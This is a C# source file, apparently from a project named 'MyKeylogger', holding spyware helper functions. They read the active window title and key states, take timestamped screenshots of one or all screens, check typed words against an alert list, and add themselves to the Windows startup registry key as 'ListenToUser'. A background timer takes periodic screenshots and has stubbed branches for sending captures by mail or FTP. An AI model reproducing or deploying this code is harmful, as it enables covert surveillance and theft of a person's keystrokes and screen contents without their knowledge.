using Microsoft.Win32;
using MyKeylogger.Lib.HotKeys;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace tt
{
    public static class Functions
    {
        [DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]

        public static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int cch);
        [DllImport("user32.dll")]

        internal static extern short GetKeyState(Keys nVirtualKey);

        public static bool IsToggled(this Keys key)
        {
            return GetKeyState(key) == 0x1;
        }

        public static bool IsKeyPressed(this Keys key)
        {
            var result = GetKeyState(key);
            switch (result)
            {
                case 0: return false;
                case 1: return false;
                default: return true;
            }
        }

        public static string GetActiveWindowText()
        {
            var handle = GetForegroundWindow();
            var sb = new StringBuilder();
            GetWindowText(handle, sb, 1000);
            return sb.Length == 0 ? "UnhandleWindow" : sb.ToString();
        }

        public static void CreateFile()
        {
            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\myKeylogger.ini"))
                return;
            File.Create(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\myKeylogger.ini").Dispose();
            // File.Create(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\myKeylogger.ini", FileAttributes.Hidden);
        }
        // not complete
        public static void SetHotKey()
        {
            HotKeySet hks = new HotKeySet(new[] { Keys.T, Keys.LShiftKey, Keys.RShiftKey });
            hks.RegisterExclusiveOrKey(new[] { Keys.LShiftKey, Keys.RShiftKey });
            //if(is)
        }
        /// <summary>
        ///  capture screen
        /// </summary>
        /// <param name="imagePath"></param>
        /// <param name="quality"></param>
        /// <param name="imageCount"></param>
        /// <param name="imageExtendtion"></param>
        /// <param name="Timestamp_Username"></param>
        public static void ScreenShotSingleScreen(string imagePath, int imageCount, Int64 quality = 100, string imageExtendtion = ".jpeg", bool Timestamp_Username = false)
        {
            var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                       Screen.PrimaryScreen.Bounds.Height,
                                       PixelFormat.Format32bppArgb);

            var gfxScreenshot = Graphics.FromImage(bmpScreenshot);

            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
                                        Screen.PrimaryScreen.Bounds.Y,
                                        0,
                                        0,
                                        Screen.PrimaryScreen.Bounds.Size,
                                        CopyPixelOperation.SourceCopy);

            string directoryImage = imagePath + DateTime.Now.ToLongDateString();

            if (!Directory.Exists(directoryImage))
            {
                Directory.CreateDirectory(directoryImage);
            }
            string imageName = "";
            if (Timestamp_Username == true)
                imageName = string.Format("{0}\\{1}{2}", directoryImage, DateTime.Now.Hour.ToString() + '_' + DateTime.Now.Minute.ToString() + '_' + DateTime.Now.Second.ToString() + '_' + imageCount + '_' + Environment.UserName, imageExtendtion);
            else
                imageName = string.Format("{0}\\{1}{2}", directoryImage, DateTime.Now.Hour.ToString() + '_' + DateTime.Now.Minute.ToString() + '_' + DateTime.Now.Second.ToString(), imageExtendtion);

            try
            {
                var encoder = ImageCodecInfo.GetImageEncoders().First(c => c.FormatID == ImageFormat.Jpeg.Guid);
                var encParams = new EncoderParameters() { Param = new[] { new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality) } };
                bmpScreenshot.Save(imageName, encoder, encParams);
            }
            catch
            {

            }
            imageCount++;


        }

        public static void ScreenShotDoubleScreen(string imagePath, Int64 quality, int imageCount, bool Timestamp_Username, string imageExtendtion)
        {
            Rectangle desktopRec = GetDesktopBound();
            Bitmap bitmap = new Bitmap(desktopRec.Width, desktopRec.Height);
            using (Graphics graphics = Graphics.FromImage(bitmap))
            {
                graphics.CopyFromScreen(desktopRec.Location, Point.Empty, bitmap.Size);
            }

            string directoryImage = imagePath + DateTime.Now.ToLongDateString();

            if (!Directory.Exists(directoryImage))
            {
                Directory.CreateDirectory(directoryImage);
            }

            string imageName = "";
            if (Timestamp_Username == true)
                imageName = string.Format("{0}\\{1}{2}", directoryImage, imageCount + '_' + DateTime.Now.Hour.ToString() + '_' + DateTime.Now.Minute.ToString() + '_' + DateTime.Now.Second.ToString() + '_' + Environment.UserName, imageExtendtion);
            else
                imageName = string.Format("{0}\\{1}{2}", directoryImage, imageCount + '_' + DateTime.Now.Hour.ToString() + '_' + DateTime.Now.Minute.ToString() + '_' + DateTime.Now.Second.ToString(), imageExtendtion);

            try
            {
                var encoder = ImageCodecInfo.GetImageEncoders().First(c => c.FormatID == ImageFormat.Jpeg.Guid);
                var encParams = new EncoderParameters() { Param = new[] { new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality) } };
                bitmap.Save(imageName, encoder, encParams);
            }
            catch
            {

            }
            imageCount++;
        }
        private static Rectangle GetDesktopBound()
        {
            Rectangle result = new Rectangle();
            foreach (Screen screen in Screen.AllScreens)
                result = Rectangle.Union(result, screen.Bounds);
            return result;
        }


        /// Screen Recording video
        /// 

        /// Alerts
        /// 
        public static bool isAlerts(List<string> alertList, string word)
        {

            for (int i = 0; i < alertList.Count; i++)
            {
                string s = alertList.ElementAt(i);
               
                if (word.ToLower() == s.ToLower())
                {
                    return true;
                }
            }

            return false;
        }

        /// <summary>
        /// run as start up
        /// </summary>
        public static void RunStartUp()
        {
            RegistryKey regkey = Registry.CurrentUser.CreateSubKey("Software\\ListenToUser");
            RegistryKey regstart = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
            string keyvalue = "1";
            try
            {
                regkey.SetValue("Index", keyvalue);
                regstart.SetValue("ListenToUser", Application.StartupPath + "\\" + Application.ProductName + ".exe");
                regkey.Close();
            }
            catch (System.Exception ex)
            {

            }
        }
        /// <summary>
        /// disable run as start up
        /// </summary>
        public static void DontRunStartUp()
        {
            RegistryKey regkey = Registry.CurrentUser.OpenSubKey("Software\\ListenToUser", true);
            RegistryKey regstart = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            try
            {
                regkey.DeleteValue("Index", false);
                regstart.DeleteValue("ListenToUser", false);
                regkey.Close();
                regstart.Close();
            }
            catch (System.Exception ex)
            {

            }
        }

        /// Timing counter
        /// sec = time need to use 
        /// type = 1 : screenshot
        /// type = 2 : sendmail
        /// type = 3 : upload to ftp
        static int interval = 1;
        public static void StartTimmer(int sec, int type, int randnum = 0)
        {
            Thread thread = new Thread(() => {
                while (true)
                {
                    Thread.Sleep(1);
                    // generate random number
                    if (randnum == 0)
                    {
                        Random rnd = new Random();
                        randnum = rnd.Next();
                    }
                    ////
                    if (interval % sec == 0)
                        switch (type)
                        {
                            case 1:
                                // screenshot
                                ScreenShotSingleScreen("ScreenShot\\",randnum);
                                break;
                            case 2:
                                // send mail
                                break;
                            case 3:
                                // upload to ftp
                                break;
                        }
                        
                        ///CaptureScreen();
                        ///send mail func;
                        ///do something here

                    interval++;

                    if (interval >= 1000000)
                        interval = 0;
                }
            });
            thread.IsBackground = true;
            thread.Start();
        }
    }
}